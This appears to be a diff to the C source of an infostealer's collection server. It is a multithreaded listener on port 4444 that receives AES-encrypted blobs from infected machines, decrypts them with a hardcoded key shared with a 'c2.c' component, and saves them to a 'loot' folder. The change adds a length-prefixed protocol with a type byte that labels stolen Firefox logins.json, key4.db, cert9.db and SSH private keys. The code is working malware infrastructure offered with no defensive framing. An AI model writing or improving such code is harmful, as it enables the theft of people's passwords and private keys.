@@ -10,21 +10,20 @@
 #include <pthread.h>
 
 #include "aes.h"
+#include "filetypes.h"
 
 #define PORT 4444
 #define BUFFER_SIZE 4096
 #define SAVE_DIR "./loot"
-// Hardcoded AES key and IV (must match c2.c)
+
 
 static const uint8_t key[16] = {
     0x13, 0x37, 0xBA, 0xD0, 0xC0, 0xFF, 0xEE, 0x12,
-    0x42, 0x24, 0x81, 0x19, 0x99, 0x88, 0x77, 0x66
-};
+    0x42, 0x24, 0x81, 0x19, 0x99, 0x88, 0x77, 0x66};
 
 static const uint8_t iv[16] = {
     0x10, 0x32, 0x54, 0x76, 0x98, 0xBA, 0xDC, 0xFE,
-    0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF
-};
+    0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF};
 
 pthread_mutex_t id_lock = PTHREAD_MUTEX_INITIALIZER;
 int dump_counter = 0;
@@ -39,27 +38,65 @@ void *handle_client(void *arg) {
     char ipstr[INET_ADDRSTRLEN];
     inet_ntop(AF_INET, &(info->addr.sin_addr), ipstr, sizeof(ipstr));
 
-    uint8_t buffer[BUFFER_SIZE] = {0};
-    ssize_t received = recv(info->sock, buffer, BUFFER_SIZE, 0);
-    if (received <= 0) {
-#ifdef DEBUG
-        fprintf(stderr, "[DEBUG] recv() failed or returned 0 from %s\n", ipstr);
-#endif
+    // === Read file type (1 byte) ===
+    uint8_t file_type;
+    if (recv(info->sock, &file_type, 1, MSG_WAITALL) != 1) {
+        perror("[ERROR] recv(file_type)");
         close(info->sock);
         free(info);
         pthread_exit(NULL);
     }
 
+    // === Read payload length (4 bytes) ===
+    uint32_t net_len;
+    if (recv(info->sock, &net_len, 4, MSG_WAITALL) != 4) {
+        perror("[ERROR] recv(length)");
+        close(info->sock);
+        free(info);
+        pthread_exit(NULL);
+    }
+
+    size_t padded_len = ntohl(net_len);
+    if (padded_len == 0 || padded_len > 10 * 1024 * 1024) {
+        fprintf(stderr, "[ERROR] Invalid length received: %zu\n", padded_len);
+        close(info->sock);
+        free(info);
+        pthread_exit(NULL);
+    }
+
+    uint8_t *buffer = malloc(padded_len);
+    if (!buffer) {
+        perror("[ERROR] malloc");
+        close(info->sock);
+        free(info);
+        pthread_exit(NULL);
+    }
+
+    // === Receive encrypted payload ===
+    size_t total = 0;
+    while (total < padded_len) {
+        ssize_t n = recv(info->sock, buffer + total, padded_len - total, 0);
+        if (n <= 0) {
+            perror("[ERROR] recv(data)");
+            free(buffer);
+            close(info->sock);
+            free(info);
+            pthread_exit(NULL);
+        }
+        total += n;
+    }
+
 #ifdef DEBUG
-    fprintf(stderr, "[DEBUG] Received %zd bytes from %s\n", received, ipstr);
+    fprintf(stderr, "[DEBUG] Received %zu bytes from %s\n", total, ipstr);
 #endif
 
-    // Decrypt the buffer
+    // === Decrypt buffer ===
     struct AES_ctx ctx;
     AES_init_ctx_iv(&ctx, key, iv);
-    AES_CBC_decrypt_buffer(&ctx, buffer, received);
+    AES_CBC_decrypt_buffer(&ctx, buffer, padded_len);
 
-    // === Strip Padding ===
+    // === Strip PKCS#7 padding ===
+    size_t received = padded_len;
     if (received > 0) {
         uint8_t padding = buffer[received - 1];
         if (padding > 0 && padding <= AES_BLOCKLEN && padding <= received) {
@@ -70,16 +107,17 @@ void *handle_client(void *arg) {
         }
     }
 
-    // ===  file type ===
-    const char *type = "unknown";
-    if (received >= 15 && memcmp(buffer, "SQLite format 3", 15) == 0) {
-        type = "sqlite"; // likely key4.db or Chrome Login Data
-    } else if (strstr((char*)buffer, "\"logins\"")) {
-        type = "firefox_logins_json";
-    } else if (strstr((char*)buffer, "PRIVATE KEY")) {
-        type = "ssh_private_key";
+    // === Convert file_type to label ===
+    const char *type;
+    switch (file_type) {
+        case FILETYPE_FIREFOX_LOGINS_JSON: type = "firefox_logins_json"; break;
+        case FILETYPE_FIREFOX_KEY4_DB:     type = "firefox_key4_db";     break;
+        case FILETYPE_FIREFOX_CERT9_DB:    type = "firefox_cert9_db";    break;
+        case FILETYPE_SSH_KEY:     type = "ssh_key";     break;
+        default:                           type = "unknown";             break;
     }
 
+    // === Create filename ===
     time_t now = time(NULL);
     struct tm *t = localtime(&now);
 
@@ -95,26 +133,26 @@ void *handle_client(void *arg) {
              t->tm_hour, t->tm_min, t->tm_sec,
              id);
 
-    // === Save decrypted buffer ===
     FILE *fp = fopen(filename, "wb");
     if (!fp) {
         perror("[ERROR] fopen");
+        free(buffer);
         close(info->sock);
         free(info);
         pthread_exit(NULL);
     }
 
-    fwrite(buffer, 1, received, fp); 
+    fwrite(buffer, 1, received, fp);
     fclose(fp);
     close(info->sock);
-
+    free(buffer);
+    if (file_type == FILETYPE_FIREFOX_LOGINS_JSON){
+    printf("[+] Received Firefox logins JSON (%zu bytes) from %s\n", received, ipstr);
+    } 
     printf("[+] Saved blob to: %s\n", filename);
-
     free(info);
     pthread_exit(NULL);
 }
-
-
 
 int main(void) {
     mkdir(SAVE_DIR, 0700);
@@ -130,7 +168,7 @@ int main(void) {
     addr.sin_port = htons(PORT);
     addr.sin_addr.s_addr = INADDR_ANY;
 
-    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
         perror("[ERROR] bind");
         close(server_fd);
         return 1;
@@ -147,7 +185,7 @@ int main(void) {
     while (1) {
         client_info_t *info = malloc(sizeof(client_info_t));
         socklen_t len = sizeof(info->addr);
-        info->sock = accept(server_fd, (struct sockaddr*)&info->addr, &len);
+        info->sock = accept(server_fd, (struct sockaddr *)&info->addr, &len);
         if (info->sock < 0) {
             perror("[ERROR] accept");
             free(info);
@@ -162,7 +200,7 @@ int main(void) {
 
         pthread_t tid;
         pthread_create(&tid, NULL, handle_client, info);
-        pthread_detach(tid); 
+        pthread_detach(tid);
     }
 
     close(server_fd);
